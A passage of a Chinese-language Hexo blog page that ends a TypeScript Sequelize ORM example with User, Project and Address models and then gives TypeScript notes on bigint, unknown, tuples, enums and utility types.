class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;Sequelize, Model, DataTypes, BuildOptions&#125; <span class="keyword">from</span> <span class="string">&#x27;sequelize&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">    HasManyGetAssociationsMixin,</span><br><span class="line">    HasManyAddAssociationMixin,</span><br><span class="line">    HasManyHasAssociationMixin,</span><br><span class="line">    Association,</span><br><span class="line">    HasManyCountAssociationsMixin,</span><br><span class="line">    HasManyCreateAssociationMixin</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;sequelize&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 连接数据库</span></span><br><span class="line"><span class="keyword">const</span> sequelize = <span class="keyword">new</span> Sequelize(<span class="string">&#x27;mysql://root:asd123@localhost:3306/mydb&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置一个User表的操作对象</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> id!: <span class="built_in">number</span>; <span class="comment">// &#x27;!&#x27;非空断言必须得有</span></span><br><span class="line">    <span class="keyword">public</span> name!: <span class="built_in">string</span>;</span><br><span class="line">    <span class="keyword">public</span> preferredName!: <span class="built_in">string</span> | <span class="literal">null</span>; <span class="comment">// for nullable fields</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// timestamps时间戳</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> createdAt!: <span class="built_in">Date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> updatedAt!: <span class="built_in">Date</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置关联表</span></span><br><span class="line">    <span class="keyword">public</span> getProjects!: HasManyGetAssociationsMixin&lt;Project&gt;; <span class="comment">// Note the null assertions!</span></span><br><span class="line">    <span class="keyword">public</span> addProject!: HasManyAddAssociationMixin&lt;Project, <span class="built_in">number</span>&gt;;</span><br><span class="line">    <span class="keyword">public</span> hasProject!: HasManyHasAssociationMixin&lt;Project, <span class="built_in">number</span>&gt;;</span><br><span class="line">    <span class="keyword">public</span> countProjects!: HasManyCountAssociationsMixin;</span><br><span class="line">    <span class="keyword">public</span> createProject!: HasManyCreateAssociationMixin&lt;Project&gt;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> projects?: Project[]; <span class="comment">// Note this is optional since it&#x27;s only populated when explicitly requested in code</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> associations: &#123;</span><br><span class="line">        <span class="attr">projects</span>: Association&lt;User, Project&gt;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Project表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Project</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> id!: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">public</span> ownerId!: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">public</span> name!: <span class="built_in">string</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> createdAt!: <span class="built_in">Date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> updatedAt!: <span class="built_in">Date</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Address表</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Address</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> userId!: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">public</span> address!: <span class="built_in">string</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> createdAt!: <span class="built_in">Date</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">readonly</span> updatedAt!: <span class="built_in">Date</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化Project表</span></span><br><span class="line">Project.init(&#123;</span><br><span class="line">    <span class="attr">id</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: DataTypes.INTEGER.UNSIGNED, <span class="comment">// you can omit the `new` but this is discouraged</span></span><br><span class="line">        <span class="attr">autoIncrement</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">primaryKey</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">ownerId</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: DataTypes.INTEGER.UNSIGNED,</span><br><span class="line">        <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">name</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="keyword">new</span> DataTypes.STRING(<span class="number">128</span>),</span><br><span class="line">        <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    sequelize,</span><br><span class="line">    <span class="attr">tableName</span>: <span class="string">&#x27;projects&#x27;</span>,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化User表</span></span><br><span class="line">User.init(&#123;</span><br><span class="line">    <span class="attr">id</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: DataTypes.INTEGER.UNSIGNED,</span><br><span class="line">        <span class="attr">autoIncrement</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">primaryKey</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">name</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="keyword">new</span> DataTypes.STRING(<span class="number">128</span>),</span><br><span class="line">        <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">preferredName</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="keyword">new</span> DataTypes.STRING(<span class="number">128</span>),</span><br><span class="line">        <span class="attr">allowNull</span>: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">tableName</span>: <span class="string">&#x27;users&#x27;</span>,</span><br><span class="line">    <span class="attr">sequelize</span>: sequelize,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化Address表</span></span><br><span class="line">Address.init(&#123;</span><br><span class="line">    <span class="attr">userId</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: DataTypes.INTEGER.UNSIGNED,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">address</span>: &#123;</span><br><span class="line">        <span class="attr">type</span>: <span class="keyword">new</span> DataTypes.STRING(<span class="number">128</span>),</span><br><span class="line">        <span class="attr">allowNull</span>: <span class="literal">false</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, &#123;</span><br><span class="line">    <span class="attr">tableName</span>: <span class="string">&#x27;address&#x27;</span>,</span><br><span class="line">    <span class="attr">sequelize</span>: sequelize, <span class="comment">// this bit is important</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 为Project表设置一个外键ownerId绑定约束到User表中</span></span><br><span class="line">User.hasMany(Project, &#123;</span><br><span class="line">    <span class="attr">sourceKey</span>: <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">    <span class="attr">foreignKey</span>: <span class="string">&#x27;ownerId&#x27;</span>,</span><br><span class="line">    <span class="attr">as</span>: <span class="string">&#x27;projects&#x27;</span> <span class="comment">// this determines the name in `associations`!</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Address表的外键约束绑定到User表的id</span></span><br><span class="line">Address.belongsTo(User, &#123;<span class="attr">targetKey</span>: <span class="string">&#x27;id&#x27;</span>&#125;);</span><br><span class="line">User.hasOne(Address, &#123;<span class="attr">sourceKey</span>: <span class="string">&#x27;id&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">stuff</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> newUser = <span class="keyword">await</span> User.create(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;Johnny&#x27;</span>,</span><br><span class="line">        <span class="attr">preferredName</span>: <span class="string">&#x27;John&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(newUser.id, newUser.name, newUser.preferredName);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个first Project记录生成时会与User的id绑定，ownerId对应User表里的id记录，而Project的id作为索引自增</span></span><br><span class="line">    <span class="keyword">const</span> project = <span class="keyword">await</span> newUser.createProject(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;first!&#x27;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// findByPk()，其中Pk为primary_key，即user表的索引ID，并且列出与该user有关的projects</span></span><br><span class="line">    <span class="keyword">const</span> ourUser = <span class="keyword">await</span> User.findByPk(<span class="number">1</span>, &#123;</span><br><span class="line">        <span class="attr">include</span>: [User.associations.projects],</span><br><span class="line">        <span class="attr">rejectOnEmpty</span>: <span class="literal">true</span>, <span class="comment">// Specifying true here removes `null` from the return type!</span></span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(ourUser.projects![<span class="number">0</span>].name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>














</p>
      <div class="post-button"><a class="btn" href="/2021/05/03/orm/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>
  <div class="lx-entry padding">
    <div>
      <h2 class="title"><a href="/2021/05/01/ts-notes/">ts随笔</a></h2>
      <span class="lx-post-detail"><i class="fa fa-calendar-o"></i> 2021-05-01</span>
      <p><pre><code>该笔记主要记录了一些编码过程中比较常见但是又容易模糊的知识点
</code></pre>
<p><strong>原始类型</strong>：<code>string</code>, <code>boolean</code>, <code>number</code>, <code>null</code>, <code>void</code>, <code>symbol</code>, <code>undefined</code>, <code>bigint</code></p>
<p>Tip: 编码过程中也有类似的关键字<code>Boolean</code>, <code>Number</code>, <code>String</code>等，这是JS的构造函数，和类型完全不同。</p>
<p><strong>Bigint</strong></p>
<p>使用Bigint可以安全地存储和操作大整数，即这个数已经超过了JS构造函数<code>Number</code>能够表示的安全整数范围，使用<code>Bigint</code>需要使用<code>ESnext</code>编译辅助库。</p>
<p>下面两段代码就可以看出区别：</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> max = <span class="built_in">Number</span>.MAX_SAFE_INTEGER; <span class="comment">// 2^53-1</span></span><br><span class="line"><span class="keyword">const</span> max1 = max + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> max2 = max + <span class="number">2</span>;</span><br><span class="line"><span class="built_in">console</span>.log(max1 === max2); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> max = <span class="built_in">BigInt</span>(<span class="built_in">Number</span>.MAX_SAFE_INTEGER); <span class="comment">// 2^53-1</span></span><br><span class="line"><span class="keyword">const</span> max1 = max + <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">const</span> max2 = max + <span class="number">2n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(max1 === max2); <span class="comment">// false</span></span><br></pre></td></tr></table></figure>





<p><strong>unknown和any</strong></p>
<p><code>unknown</code>是更安全的<code>any</code>类型，<code>any</code>类型在赋值之前，可以通过.去获取属性和方法不会抛错，但是<code>unknown</code>会。</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> value: <span class="built_in">any</span>;</span><br><span class="line">value.foo.bar; <span class="comment">// ok</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo: unknown;</span><br><span class="line">zoo.foo; <span class="comment">// error</span></span><br></pre></td></tr></table></figure>









<p><strong>元组</strong></p>
<p>元组与数组非常相似，元组可以说是类型更加严格的数组。</p>
<p>元组定义完后可以通过<code>push</code>添加元素，但是获取时会报错</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> x: [<span class="built_in">string</span>, <span class="built_in">number</span>];</span><br><span class="line">x = [<span class="string">&quot;robin&quot;</span>, <span class="number">10</span>]; <span class="comment">// ok</span></span><br><span class="line">x = [<span class="number">10</span>]; <span class="comment">// error</span></span><br><span class="line"></span><br><span class="line">x.push(<span class="number">2</span>);</span><br><span class="line">x[<span class="number">2</span>]; <span class="comment">// error</span></span><br></pre></td></tr></table></figure>







<p><strong>枚举的本质</strong></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">enum</span> Direction&#123;</span><br><span class="line">		up,</span><br><span class="line">		left,</span><br><span class="line">		down,</span><br><span class="line">		right</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(Direction.up) <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">console</span>.log(Direction[<span class="number">0</span>]) <span class="comment">// up</span></span><br></pre></td></tr></table></figure>

<p>从上述例子中可以看出枚举中实现了正反向同时映射，平常的例子中，一般都是正向映射，比如一个对象，<code>key =&gt; value</code>；</p>
<p>直接看看枚举编译后的JS代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Direction;</span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">Direction</span>) </span>&#123;</span><br><span class="line">		Direction[Direction[<span class="string">&#x27;up&#x27;</span>] = <span class="number">0</span>] = <span class="string">&#x27;up&#x27;</span>;</span><br><span class="line">  	<span class="comment">// ...</span></span><br><span class="line">&#125;) (Direction || (Direction = &#123;&#125;));</span><br></pre></td></tr></table></figure>





<p><strong>实现一个完善的pick函数，用于获取对象中的value</strong></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> KVObject &#123;</span><br><span class="line">    [key: <span class="built_in">string</span>]: <span class="built_in">any</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pick</span>&lt;<span class="title">T</span>, <span class="title">K</span> <span class="title">extends</span> <span class="title">keyof</span> <span class="title">T</span>&gt;(<span class="params">o: T, names: <span class="built_in">Array</span>&lt;K&gt;</span>): <span class="title">Array</span>&lt;<span class="title">T</span>[<span class="title">K</span>]&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> names.map(<span class="function">(<span class="params">n: K</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o[n];</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj: KVObject = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;robin&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">25</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(pick(obj, [<span class="string">&quot;username&quot;</span>, <span class="string">&#x27;age&#x27;</span>]));</span><br></pre></td></tr></table></figure>



<p><strong>把接口中的成员变成可选，这个场景十份常见，我们在声明一个接口后，常常在声明变量的时候去利用这个接口，但是在声明变量时，变量内的属性或者方法一时半会又给不到，这时候利用以下这个方法就可以有效兼容</strong></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> User &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="built_in">string</span>;</span><br><span class="line">    id: <span class="built_in">number</span>;</span><br><span class="line">    token: <span class="built_in">string</span>;</span><br><span class="line">    avatar: <span class="built_in">string</span>;</span><br><span class="line">    role: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> partial&lt;T&gt; = &#123; [K <span class="keyword">in</span> keyof T]? : T[K] &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user: partial&lt;User&gt; = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<p><strong>类型编程：编写一个工具类型将<code>interface</code>中函数类型的名称取出来</strong></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> Part &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">    subParts: Part[];</span><br><span class="line">    updatePart(newName: <span class="built_in">string</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> FunctionPropName&lt;T&gt; = &#123;[K <span class="keyword">in</span> keyof T]: T[K] <span class="keyword">extends</span> <span class="built_in">Function</span> ? K: <span class="built_in">never</span>&#125;[keyof T];</span><br><span class="line"><span class="keyword">type</span> funcName = FunctionPropName&lt;Part&gt;; <span class="comment">// type funcName = &#x27;updatePart&#x27;</span></span><br></pre></td></tr></table></figure>





<p><strong>类型编程：取出下面<code>interface</code>中的可选类型（利用空对象进行扩展甄别，网上看到的一种方法，很巧妙）</strong></p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> People &#123;</span><br><span class="line">    <span class="keyword">readonly</span> n: <span class="built_in">number</span>;</span><br><span class="line">    id: <span class="built_in">string</span>;</span><br><span class="line">    name: <span class="built_in">string</span>;</span><br><span class="line">    age?: <span class="built_in">number</span>;</span><br><span class="line">    <span class="keyword">from</span>?: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> OptionalKeys&lt;T&gt; = &#123;[K <span class="keyword">in</span> keyof T]-?: (&#123;&#125; <span class="keyword">extends</span> &#123;[P <span class="keyword">in</span> K]: T[P]&#125; ? K : <span class="built_in">never</span>)&#125;[keyof T];</span><br><span class="line"><span class="keyword">type</span> r = OptionalKeys&lt;People&gt;; <span class="comment">// &#x27;age&#x27;|&#x27;from&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须属性</span></span><br><span class="line"><span class="keyword">type</span> RequiredKeys&lt;T&gt; = &#123;[K <span class="keyword">in</span> keyof T]-?: (&#123;&#125; <span class="keyword">extends</span> &#123;[P <span class="keyword">in</span> K]: T[P]&#125; ? <span class="built_in">never</span> : K)&#125;[keyof T];</span><br></pre></td></tr></table></figure>
</p>
      <div class="post-button"><a class="btn" href="/2021/05/01/ts-notes/" rel="noopener"><i class="fa fa-angle-double-right fa-fw"></i>Read More</a></div>
    </div>
  </div>




<footer>
  <div>
  Copyright &copy; 2021.<a href="/">ROBIN-3910</a><br>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme <a href="https://lx.js.org" target="_blank">Lx</a><br>
  </div>
</footer>

  </div>
</div>
</div>

<button class="hamburger hamburger--arrow-r" type="button">
    <div class="hamburger-box">
      <div class="hamburger-inner"></div>
    </div>
</button> 
<div class="menu visibility">
  <div class="menu-head">
    <span class="layer">
      <div class="col">
        <div class="row for-pic">
          <div class="profile-pic">
            <a href="/"><img src="/images/avatar.jpeg" alt="rob_曾洛镔"/></a>
          </div>
        </div>
        <div class="row for-name">
          <p>rob_曾洛镔</p>
          <span class="tagline">祝你暴富🤩</span>
        </div>
      </div>
    </span>
  </div>
  <nav class="menu-container">
  <ul class="menu-items">
    <li><a href="/"><i class="fa fa-home fa-fw"></i>Home</a></li>
    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
    
    
    
  </ul>
  </nav>
</div>

<div class="gototop js-top">
  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
</div>
<script src="//cdn.jsdelivr.net/npm/theme-lx@0.3.9/source/js/jquery.easing.min.js"></script>
<script>
(function () {
	"use strict";
	var goToTop = function() {
		$(".js-gotop").on("click", function(event){
			event.preventDefault();
			$("html, body").animate({
				scrollTop: $("html").offset().top
			}, 500, "easeInOutExpo");
			return false;
		});
		$(window).scroll(function(){
			var $win = $(window);
			if ($win.scrollTop() > 200) {
				$(".js-top").addClass("active");
			} else {
				$(".js-top").removeClass("active");
			}
		});
	};
	$(function(){
		goToTop();
	});
}());
</script>


</body>
</html>
